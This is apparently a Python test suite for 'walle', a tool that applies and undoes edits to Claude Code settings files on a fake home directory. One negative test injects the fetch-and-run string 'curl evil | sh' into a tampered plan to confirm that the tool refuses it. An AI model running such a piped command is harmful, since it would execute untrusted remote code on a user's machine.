"""walle apply and walle undo on a fake home (plan step C5). Nothing here reads or writes the real ~/.claude."""

import hashlib
import io
import json
import os
import stat
import sys
import unittest
from pathlib import Path
from contextlib import redirect_stderr, redirect_stdout
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_keep import tree_hash  # noqa: E402
from test_trim import OVERRIDES, Fixture  # noqa: E402

from walle import apply, cli, runs  # noqa: E402


def sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


class ApplyFixture(Fixture):
    """The trim fixture, with apply's home and process list replaced: no Claude process runs."""

    def __init__(self, procs=None):
        super().__init__()
        self.settings = self.home / ".claude" / "settings.json"
        self.claude_json = self.home / ".claude.json"
        # Two-space JSON without a final newline, as Claude Code writes it.
        self.claude_json.write_text(json.dumps(
            {"numStartups": 3, "projects": {"/w": {"mcpServers": {"rea": {"command": "rea",
                                                                       "env": {"TOKEN": "s3cr3t-value"}}}}}},
            indent=2))
        self.settings.write_text(json.dumps({"enabledPlugins": {"typesafe@typesafe-ai": True,
                                                                "secret-redact@secret-redact": True},
                                             "skillOverrides": OVERRIDES, "theme": "dark"}, indent=2) + "\n")
        os.chmod(self.claude_json, 0o600)
        self.procs = list(procs or [])
        more = [mock.patch("walle.apply.HOME", self.home), mock.patch("walle.apply.RECHECK_SECONDS", 0),
                mock.patch("walle.apply.claude_processes", lambda home=None: self.procs)]
        for p in more:
            p.start()
        self.patches += more
        self.backups = self.out.parent / "backups"

    def rows(self, data: dict) -> dict:
        return {r["source"]["name"]: r for r in data["rows"]}

    def cli_out(self, out: Path, *args, code=0) -> tuple[str, str]:
        o, e = io.StringIO(), io.StringIO()
        with redirect_stdout(o), redirect_stderr(e):
            got = cli.main(["--out", str(out), *args])
        assert got == code, (args, got, o.getvalue(), e.getvalue())
        return o.getvalue(), e.getvalue()


class ApplyUndoTest(unittest.TestCase):
    def setUp(self):
        self.f = ApplyFixture()

    def tearDown(self):
        self.f.close()

    def test_the_plan_records_each_target_and_its_hash(self):
        data, _ = self.f.plan()
        rows = self.f.rows(data)
        ts = rows["typesafe"]["change"]
        self.assertEqual((ts["path"], ts["sha256"]), (str(self.f.settings), sha(self.f.settings)))
        self.assertEqual(rows["rea"]["change"]["sha256"], sha(self.f.claude_json))
        self.assertEqual(data["targets"], {str(self.f.settings): sha(self.f.settings),
                                           str(self.f.claude_json): sha(self.f.claude_json)})
        self.assertNotIn("sha256", rows["claude.ai Vercel"]["change"])  # a manual row has no target file
        self.assertEqual((ts["already"], rows["rea"]["change"]["already"]), (False, False))
        # The plan is a run of the index too: walle runs lists it, and an apply points at it.
        self.assertEqual([r["kind"] for r in runs.read_index(self.f.out)], ["trim"])

    def test_apply_then_undo_puts_back_the_same_bytes(self):
        before = self.f.settings.read_bytes()
        mode = stat.S_IMODE(self.f.settings.stat().st_mode)
        projects = tree_hash(self.f.home / "projects")
        data, run_dir = self.f.plan()
        rows = self.f.rows(data)
        ids = [rows["typesafe"]["id"], rows["pptx-like"]["id"]]
        out, err = self.f.cli("apply", run_dir.name, "--only", ",".join(ids))
        self.assertEqual(err, "")
        doc = json.loads(self.f.settings.read_text())
        self.assertIs(doc["enabledPlugins"]["typesafe@typesafe-ai"], False)
        self.assertIs(doc["enabledPlugins"]["secret-redact@secret-redact"], True)
        self.assertEqual(doc["skillOverrides"], {**OVERRIDES, "pptx-like": "user-invocable-only"})
        self.assertEqual(doc["theme"], "dark")
        self.assertTrue(self.f.settings.read_text().endswith("}\n"))
        self.assertIn(f'changed  {rows["typesafe"]["id"]}  ~/.claude/settings.json '
                      'enabledPlugins["typesafe@typesafe-ai"]: true -> false', out)
        self.assertIn('skillOverrides["pptx-like"]: (none) -> "user-invocable-only"', out)
        # The record: index line of kind apply whose parent is the plan, apply.json, and the backup.
        index = runs.read_index(self.f.out)
        self.assertEqual([r["kind"] for r in index], ["trim", "apply"])
        a = index[-1]
        self.assertEqual((a["parent_id"], sorted(a["rows"]), a["files"], a["status"]),
                         (run_dir.name, sorted(ids), ["~/.claude/settings.json"], "applied"))
        self.assertEqual(out.strip().splitlines()[-1], str(self.f.out / a["id"] / "apply.md"))
        # The apply id leads to the two views that measure it.
        self.assertIn(f"Then    walle context --compare {a['id']}  (after a new session)", out)
        self.assertIn(f"        walle eve --around {a['id']}  (after 10 sessions)", out)
        self.assertIn(f"walle eve --around {a['id']}", (self.f.out / "index.html").read_text())
        backup = self.f.backups / a["id"]
        self.assertEqual(stat.S_IMODE(backup.stat().st_mode), 0o700)
        undo = json.loads((backup / "undo.json").read_text())
        e = undo["files"][0]
        self.assertEqual((e["sha256_before"], e["sha256_after"]),
                         (hashlib.sha256(before).hexdigest(), sha(self.f.settings)))
        self.assertEqual((backup / e["before"]).read_bytes(), before)
        self.assertEqual(stat.S_IMODE((backup / e["before"]).stat().st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(self.f.settings.stat().st_mode), mode)
        self.assertEqual(json.loads((self.f.out / a["id"] / "apply.json").read_text())["run"]["parent_id"], run_dir.name)
        # walle undo: the same bytes as before the apply, and a line of kind undo whose parent is the apply.
        out, _ = self.f.cli("undo", a["id"])
        self.assertEqual(self.f.settings.read_bytes(), before)
        self.assertIn("restored ~/.claude/settings.json", out)
        u = runs.read_index(self.f.out)[-1]
        self.assertEqual((u["kind"], u["parent_id"], u["status"]), ("undo", a["id"], "restored"))
        _out, err = self.f.cli("undo", a["id"], code=1)
        self.assertIn(f"walle undo: {a['id']} was undone at ", err)
        self.assertEqual(self.f.settings.read_bytes(), before)
        # Nothing was written into the projects folder at any step.
        self.assertEqual(tree_hash(self.f.home / "projects"), projects)

    def test_a_target_that_changed_since_the_plan_is_refused(self):
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        self.f.settings.write_text(self.f.settings.read_text().replace('"dark"', '"light"'))
        changed = self.f.settings.read_bytes()
        _out, err = self.f.cli("apply", run_dir.name, "--only", ts["id"], code=1)
        self.assertIn(f"walle apply: ~/.claude/settings.json changed since plan {run_dir.name} (sha256 "
                      f"{ts['change']['sha256'][:8]} -> {sha(self.f.settings)[:8]}). Run walle trim --plan again. "
                      "Nothing changed.", err)
        self.assertEqual(self.f.settings.read_bytes(), changed)
        self.assertFalse(self.f.backups.exists())
        self.assertEqual([r["kind"] for r in runs.read_index(self.f.out)], ["trim"])
        # A plan made before walle recorded hashes is refused too.
        plan = json.loads((run_dir / "plan.json").read_text())
        for r in plan["rows"]:
            r["change"].pop("sha256", None)
        (run_dir / "plan.json").write_text(json.dumps(plan))
        _out, err = self.f.cli("apply", run_dir.name, "--only", ts["id"], code=1)
        self.assertIn("has no file hash for ~/.claude/settings.json", err)

    def test_undo_stops_and_names_the_keys_after_an_outside_edit(self):
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        self.f.cli("apply", run_dir.name, "--only", ts["id"])
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        doc = json.loads(self.f.settings.read_text())
        doc["enabledPlugins"]["typesafe@typesafe-ai"] = True  # the user turned it on again in /plugin
        doc["env"] = {"API_TOKEN": "tok-12345"}
        self.f.settings.write_text(json.dumps(doc, indent=2) + "\n")
        edited = self.f.settings.read_bytes()
        _out, err = self.f.cli("undo", apply_id, code=1)
        self.assertEqual(self.f.settings.read_bytes(), edited)
        self.assertIn(f"walle undo: ~/.claude/settings.json changed after apply {apply_id}. Nothing is restored.", err)
        self.assertIn('  a key this apply changed: enabledPlugins["typesafe@typesafe-ai"]', err)
        self.assertIn('  changed: enabledPlugins["typesafe@typesafe-ai"]', err)
        self.assertIn("  added: env", err)
        self.assertNotIn("tok-12345", err)
        self.assertIn(f"The file before the apply: {self.f.backups / apply_id / 'before' / '1-settings.json'}.", err)
        self.assertEqual(runs.read_index(self.f.out)[-1]["kind"], "apply")  # no undo line

    def test_claude_json_needs_app_closed_and_no_claude_process(self):
        data, run_dir = self.f.plan()
        rea = self.f.rows(data)["rea"]
        self.assertEqual(rea["change"]["op"], "remove")
        before = self.f.claude_json.read_bytes()
        _out, err = self.f.cli("apply", run_dir.name, "--only", rea["id"], code=1)
        self.assertIn("walle apply: ~/.claude.json needs --app-closed.", err)
        self.f.procs[:] = ["4242 claude", "4243 2.1.299-abc"]
        _out, err = self.f.cli("apply", run_dir.name, "--only", rea["id"], "--app-closed", code=1)
        self.assertIn("a Claude process runs (4242 claude, 4243 2.1.299-abc)", err)
        self.f.procs[:] = []
        with mock.patch("walle.apply.claude_processes", lambda home=None: None):
            _out, err = self.f.cli("apply", run_dir.name, "--only", rea["id"], "--app-closed", code=1)
        self.assertIn("cannot list processes", err)
        self.assertEqual(self.f.claude_json.read_bytes(), before)
        self.assertFalse(self.f.backups.exists())
        out, err = self.f.cli("apply", run_dir.name, "--only", rea["id"], "--app-closed")
        doc = json.loads(self.f.claude_json.read_text())
        self.assertEqual(doc["projects"]["/w"]["mcpServers"], {})
        self.assertEqual(doc["numStartups"], 3)
        self.assertFalse(self.f.claude_json.read_text().endswith("\n"))
        self.assertEqual(stat.S_IMODE(self.f.claude_json.stat().st_mode), 0o600)
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        # The secret value is in the private backup only: not on screen, not in the records.
        backup = self.f.backups / apply_id
        records = out + err + (backup / "undo.json").read_text() + (self.f.out / apply_id / "apply.json").read_text()
        self.assertNotIn("s3cr3t-value", records)
        self.assertIn("remove ~/.claude.json projects[\"/w\"][\"mcpServers\"][\"rea\"] (value not shown)", out)
        self.assertIn(b"s3cr3t-value", (backup / "before" / "1-claude.json").read_bytes())
        # Undo writes ~/.claude.json too: the same guard, then the same bytes.
        _out, err = self.f.cli("undo", apply_id, code=1)
        self.assertIn("needs --app-closed", err)
        self.f.cli("undo", apply_id, "--app-closed")
        self.assertEqual(self.f.claude_json.read_bytes(), before)

    def test_a_rewrite_right_after_the_write_is_reported_as_apply_lost(self):
        data, run_dir = self.f.plan()
        rea = self.f.rows(data)["rea"]

        def app_rewrites(_seconds):
            doc = json.loads(self.f.claude_json.read_text())
            doc["numStartups"] += 1
            self.f.claude_json.write_text(json.dumps(doc, indent=2))

        with mock.patch("walle.apply.RECHECK_SECONDS", 0.01), mock.patch("walle.apply.time.sleep", app_rewrites):
            _out, err = self.f.cli("apply", run_dir.name, "--only", rea["id"], "--app-closed", code=1)
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        self.assertIn(f"apply lost: ~/.claude.json changed right after walle wrote it.", err)
        self.assertEqual(runs.read_index(self.f.out)[-1]["status"], "lost")
        self.assertEqual(json.loads((self.f.backups / apply_id / "undo.json").read_text())["lost"], ["~/.claude.json"])

    def test_manual_rows_print_a_checklist_and_change_nothing(self):
        data, run_dir = self.f.plan()
        rows = self.f.rows(data)
        home_before = tree_hash(self.f.home)
        out, _ = self.f.cli("apply", run_dir.name, "--only", f"{rows['claude.ai Vercel']['id']},{rows['sales']['id']}")
        self.assertIn(f"[ ] {rows['claude.ai Vercel']['id']}  Disconnect the claude.ai connector claude.ai Vercel", out)
        self.assertIn("claude.ai Customize > Connectors > Vercel (claude.ai/customize/connectors; walle has not "
                      "confirmed the menu path)", out)
        self.assertEqual(out.count("[unconfirmed] walle has not confirmed this menu path."), 1)
        self.assertIn('a "Required" plugin needs the organization Owner (https://claude.com/docs/plugins/admin)', out)
        self.assertEqual(out.strip().splitlines()[-1], str(run_dir / "plan.md"))
        self.assertEqual(tree_hash(self.f.home), home_before)
        self.assertFalse(self.f.backups.exists())
        self.assertEqual([r["kind"] for r in runs.read_index(self.f.out)], ["trim"])

    def test_patch_rows_and_instruction_files_are_never_written(self):
        self.f.cli("scan", str(self.f.repo), "--format", "path")
        data, run_dir = self.f.plan()
        line = next(r for r in data["rows"] if r["action"] == "T10")
        hook = self.f.rows(data)["[guard]"]
        md = self.f.claude_md.read_bytes()
        projects = tree_hash(self.f.home / "projects")
        out, _ = self.f.cli("apply", run_dir.name, "--only", f"{line['id']},{hook['id']}")
        self.assertIn("Patch rows: walle does not edit these files.", out)
        self.assertIn(f"  {line['id']}  git -C {self.f.repo} apply ", out)
        self.assertEqual(self.f.claude_md.read_bytes(), md)
        self.assertEqual(tree_hash(self.f.home / "projects"), projects)
        self.assertFalse(self.f.backups.exists())

    def test_a_settings_file_that_links_into_a_scanned_folder_is_refused(self):
        inside = self.f.repo / "claude-settings.json"
        inside.write_text(self.f.settings.read_text())
        self.f.settings.unlink()
        self.f.settings.symlink_to(inside)
        self.f.cli("scan", str(self.f.repo), "--format", "path")
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        projects = tree_hash(self.f.home / "projects")
        _out, err = self.f.cli("apply", run_dir.name, "--only", ts["id"], code=1)
        self.assertIn(f"walle apply: ~/projects/app/claude-settings.json is inside ~/projects/app, a folder that "
                      "walle scans. Nothing changed.", err)
        self.assertEqual(tree_hash(self.f.home / "projects"), projects)
        self.assertFalse(self.f.backups.exists())

    def test_a_backup_folder_inside_a_scanned_folder_is_refused(self):
        self.f.cli("scan", str(self.f.home / "projects"), "--format", "path")
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        inside = self.f.home / "projects" / "runs"
        (inside / run_dir.name).mkdir(parents=True)
        for p in run_dir.iterdir():
            if p.is_file():
                (inside / run_dir.name / p.name).write_bytes(p.read_bytes())
        (inside / "index.jsonl").write_text((self.f.out / "index.jsonl").read_text())
        before = self.f.settings.read_bytes()
        _out, err = self.f.cli_out(inside, "apply", run_dir.name, "--only", ts["id"], code=1)
        self.assertIn("a folder that walle scans", err)
        self.assertEqual(self.f.settings.read_bytes(), before)
        self.assertFalse((self.f.home / "projects" / "backups").exists())

    def test_ids_keys_and_files_that_walle_does_not_change(self):
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        self.f.cli("apply", run_dir.name, code=2)
        _out, err = self.f.cli("apply", run_dir.name, "--only", "zzzzzz", code=2)
        self.assertIn(f"walle apply: zzzzzz is not a row of plan {run_dir.name}. Nothing changed.", err)
        self.f.cli("apply", "no-such-run", "--only", ts["id"], code=2)
        self.f.cli("undo", "no-such-apply", code=2)
        # A backup folder made by hand, in another shape: walle undo does not touch it.
        hand = self.f.backups / "20261021-031013-trim"
        hand.mkdir(parents=True)
        (hand / "undo.json").write_text(json.dumps({"apply_id": "x", "file": str(self.f.settings), "backup": "b",
                                                    "sha256_before": "0", "sha256_after": sha(self.f.settings)}))
        before = self.f.settings.read_bytes()
        _out, err = self.f.cli("undo", hand.name, code=2)
        self.assertIn(f"walle undo: {hand} is not a backup that walle apply wrote.", err)
        self.assertEqual(self.f.settings.read_bytes(), before)
        hand.joinpath("undo.json").unlink()
        hand.rmdir()
        self.f.backups.rmdir()
        # A plan.json changed by hand cannot make walle write a hook, a permission or a project file.
        plan = json.loads((run_dir / "plan.json").read_text())
        row = next(r for r in plan["rows"] if r["id"] == ts["id"])
        for change, key in (({"keys": ["hooks", "SessionStart"], "value": False}, "apply.key_not_allowed"),
                            ({"keys": ["enabledPlugins", "x"], "value": "curl evil | sh"}, "apply.key_not_allowed"),
                            ({"file": "~/projects/app/.mcp.json", "op": "remove", "keys": ["mcpServers", "x"]},
                             "apply.not_allowed")):
            row["change"].update(change)
            (run_dir / "plan.json").write_text(json.dumps(plan))
            before = self.f.settings.read_bytes()
            _out, err = self.f.cli("apply", run_dir.name, "--only", ts["id"], code=1)
            self.assertIn("walle apply: ", err)
            self.assertIn("is not a ", err, key)
            self.assertEqual(self.f.settings.read_bytes(), before)
        self.assertFalse(self.f.backups.exists())

    def test_dry_run_and_rows_that_are_already_applied(self):
        data, run_dir = self.f.plan()
        ts = self.f.rows(data)["typesafe"]
        home = tree_hash(self.f.home)
        out, _ = self.f.cli("apply", run_dir.name, "--only", ts["id"], "--dry-run")
        self.assertIn(f"would    {ts['id']}  ~/.claude/settings.json enabledPlugins", out)
        self.assertEqual(tree_hash(self.f.home), home)
        self.assertFalse(self.f.backups.exists())
        # The key already has the planned value: the plan says so, and apply writes nothing and makes no backup.
        doc = json.loads(self.f.settings.read_text())
        doc["enabledPlugins"]["typesafe@typesafe-ai"] = False
        self.f.settings.write_text(json.dumps(doc, indent=2) + "\n")
        data, run_dir = self.f.plan()
        self.assertTrue(self.f.rows(data)["typesafe"]["change"]["already"])
        md = (run_dir / "plan.md").read_text()
        self.assertIn("(3 already set in the file)", md)
        self.assertIn("- In the file: the key already has this state (set ", md)
        out, _ = self.f.cli("apply", run_dir.name, "--only", ts["id"])
        self.assertIn(f"already  {ts['id']}", out)
        self.assertIn("Nothing to write", out)
        self.assertFalse(self.f.backups.exists())


class PluginKeysTest(unittest.TestCase):
    """enabledPlugins["<name>@synced"] and ["<name>@inline"], synced claude.ai skill keys, and changes walle refuses
    (fake home only)."""

    def setUp(self):
        self.f = ApplyFixture()

    def tearDown(self):
        self.f.close()

    def test_a_synced_plugin_key_is_applied_and_undone(self):
        before = self.f.settings.read_bytes()
        data, run_dir = self.f.plan()
        d = self.f.rows(data)["design"]
        out, err = self.f.cli("apply", run_dir.name, "--only", d["id"])
        self.assertEqual(err, "")
        self.assertIn(f'changed  {d["id"]}  ~/.claude/settings.json enabledPlugins["design@synced"]: (none) -> false', out)
        doc = json.loads(self.f.settings.read_text())
        self.assertIs(doc["enabledPlugins"]["design@synced"], False)
        self.assertEqual(doc["skillOverrides"], OVERRIDES)
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        self.assertEqual((self.f.backups / apply_id / "before" / "1-settings.json").read_bytes(), before)
        self.f.cli("undo", apply_id)
        self.assertEqual(self.f.settings.read_bytes(), before)

    def test_an_inline_plugin_key_is_applied_and_undone(self):
        before = self.f.settings.read_bytes()
        projects = tree_hash(self.f.home / "projects")
        remote = tree_hash(self.f.remote)
        data, run_dir = self.f.plan()
        d = self.f.rows(data)["design@inline"]
        out, err = self.f.cli("apply", run_dir.name, "--only", d["id"])
        self.assertEqual(err, "")
        self.assertIn(f'changed  {d["id"]}  ~/.claude/settings.json enabledPlugins["design@inline"]: (none) -> false', out)
        doc = json.loads(self.f.settings.read_text())
        self.assertIs(doc["enabledPlugins"]["design@inline"], False)
        self.assertNotIn("design@synced", doc["enabledPlugins"])  # only the key of the row
        self.assertEqual(doc["skillOverrides"], OVERRIDES)
        self.assertEqual(doc["theme"], "dark")
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        self.assertEqual((self.f.backups / apply_id / "before" / "1-settings.json").read_bytes(), before)
        # The next plan finds the apply record: the key is set and its saving is not counted.
        again, _ = self.f.plan()
        d2 = self.f.rows(again)["design@inline"]
        self.assertEqual((d2["change"]["already"], d2["change"]["set_at"]["from"]), (True, f"walle apply {apply_id}"))
        self.assertEqual(d2["saving"]["counted"], False)
        out, _ = self.f.cli("undo", apply_id)
        self.assertIn("restored ~/.claude/settings.json", out)
        self.assertEqual(self.f.settings.read_bytes(), before)
        # walle wrote nothing into the projects folder or the desktop host's copies.
        self.assertEqual(tree_hash(self.f.home / "projects"), projects)
        self.assertEqual(tree_hash(self.f.remote), remote)

    def test_a_synced_skill_key_is_set_and_undone(self):
        before = self.f.settings.read_bytes()
        projects = tree_hash(self.f.home / "projects")
        data, run_dir = self.f.plan()
        x = self.f.rows(data)["anthropic-skills:xlsx-like"]
        out, err = self.f.cli("apply", run_dir.name, "--only", x["id"])
        self.assertEqual(err, "")
        self.assertIn(f'changed  {x["id"]}  ~/.claude/settings.json skillOverrides["anthropic-skills:xlsx-like"]: '
                      '(none) -> "user-invocable-only"', out)
        doc = json.loads(self.f.settings.read_text())
        self.assertEqual(doc["skillOverrides"], {**OVERRIDES, "anthropic-skills:xlsx-like": "user-invocable-only"})
        apply_id = runs.read_index(self.f.out)[-1]["id"]
        self.assertEqual((self.f.backups / apply_id / "before" / "1-settings.json").read_bytes(), before)
        self.assertEqual(stat.S_IMODE((self.f.backups / apply_id).stat().st_mode), 0o700)
        # The next plan finds the apply record: the key is set, its time is the apply's, and no saving counts.
        again, _ = self.f.plan()
        x2 = self.f.rows(again)["anthropic-skills:xlsx-like"]
        self.assertTrue(x2["change"]["already"])
        self.assertEqual(x2["change"]["set_at"]["from"], f"walle apply {apply_id}")
        self.assertEqual(x2["saving"]["counted"], False)
        self.f.cli("undo", apply_id)
        self.assertEqual(self.f.settings.read_bytes(), before)
        self.assertEqual(tree_hash(self.f.home / "projects"), projects)

    def test_changes_that_walle_does_not_make(self):
        data, run_dir = self.f.plan()
        rows = self.f.rows(data)
        plan = json.loads((run_dir / "plan.json").read_text())
        before = self.f.settings.read_bytes()
        cases = [
            ("design", {"value": True}),  # walle never turns a plugin on
            ("design", {"file": "~/.claude/settings.local.json"}),  # the user-level settings file only
            ("design", {"file": "~/projects/app/.claude/settings.json"}),
            ("design", {"op": "unset"}),  # deleting an enabledPlugins key turns the plugin on again
            ("anthropic-skills:xlsx-like", {"op": "unset"}),  # no row deletes a key, a skillOverrides key included
            ("anthropic-skills:xlsx-like", {"op": "delete"}),
            ("anthropic-skills:xlsx-like", {"keys": ["permissions", "allow"]}),
            ("anthropic-skills:xlsx-like", {"keys": ["skillOverrides", "x", "y"]}),
            ("anthropic-skills:xlsx-like", {"file": "~/.claude.json"}),
            ("pptx-like", {"value": False}),  # skillOverrides takes the skill mode, nothing else
        ]
        for name, change in cases:
            row = next(r for r in plan["rows"] if r["id"] == rows[name]["id"])
            saved = dict(row["change"])
            row["change"].update(change)
            (run_dir / "plan.json").write_text(json.dumps(plan))
            _out, err = self.f.cli("apply", run_dir.name, "--only", row["id"], code=1)
            self.assertRegex(err, r"walle apply: .* is not a (settings file|key) that walle changes", (name, change))
            self.assertEqual(self.f.settings.read_bytes(), before)
            row["change"] = saved
        self.assertFalse(self.f.backups.exists())
        for c in ({"kind": "settings_key", "file": "~/.claude/settings.json", "op": "set",
                   "keys": ["enabledPlugins", "design@synced"], "value": False},
                  {"kind": "settings_key", "file": "~/.claude/settings.json", "op": "set",
                   "keys": ["enabledPlugins", "marketing@inline"], "value": False},
                  {"kind": "settings_key", "file": "~/.claude/settings.json", "op": "set",
                   "keys": ["skillOverrides", "anthropic-skills:pdf"], "value": "user-invocable-only"}):
            self.assertIsNone(apply.check_change(c))
        for value in (True, None, "false", 0):  # an @inline key is only set to false
            c = {"kind": "settings_key", "file": "~/.claude/settings.json", "op": "set",
                 "keys": ["enabledPlugins", "marketing@inline"], "value": value}
            self.assertEqual(apply.check_change(c), "apply.key_not_allowed", value)
        for op in ("unset", "delete", None):
            c = {"kind": "settings_key", "file": "~/.claude/settings.json", "op": op,
                 "keys": ["skillOverrides", "anthropic-skills:pdf"]}
            self.assertEqual(apply.check_change(c), "apply.key_not_allowed", op)


class PartsTest(unittest.TestCase):
    def test_json_keeps_the_layout_of_the_file(self):
        for text in ('{\n  "a": 1,\n  "b": [\n    1\n  ]\n}', '{\n    "a": "é"\n}\n', '{"a":1,"b":{}}', '{"a": 1}\n'):
            self.assertEqual(apply.dumps_like(json.loads(text), text), text)

    def test_key_paths_diff_names_keys_not_values(self):
        a = {"x": 1, "y": {"z": "secret-a"}, "gone": True}
        b = {"x": 1, "y": {"z": "secret-b"}, "new": [1]}
        self.assertEqual(apply.key_paths_diff(a, b), [("changed", ["y", "z"]), ("removed", ["gone"]), ("added", ["new"])])

    def test_claude_processes(self):
        home = Path("/home/u")
        yes = [["/home/u/.claude/remote/ccd-cli/2.1.299-686c67ec1014", "--output-format", "stream-json"],
               ["/home/u/.claude/remote/srv/683c/server", "--serve"],
               ["/home/u/.local/share/claude/versions/2.1.303"], ["claude", "-p", "hi"],
               ["node", "/usr/lib/node_modules/@anthropic-ai/claude-code/cli.js"],
               ["/Applications/Claude.app/Contents/MacOS/Claude"]]
        no = [["/usr/bin/python3", "-m", "walle", "apply"], ["python3", "/home/u/projects/x/.claude/worktrees/w/x.py"],
              ["node", "/home/u/.nvm/lib/node_modules/@playwright/mcp/cli.js", "--config", "/home/u/.claude/p.json"],
              ["vim", "/home/u/.claude.json"]]
        self.assertTrue(all(apply.is_claude(a, home) for a in yes))
        self.assertFalse(any(apply.is_claude(a, home) for a in no))


if __name__ == "__main__":
    unittest.main()
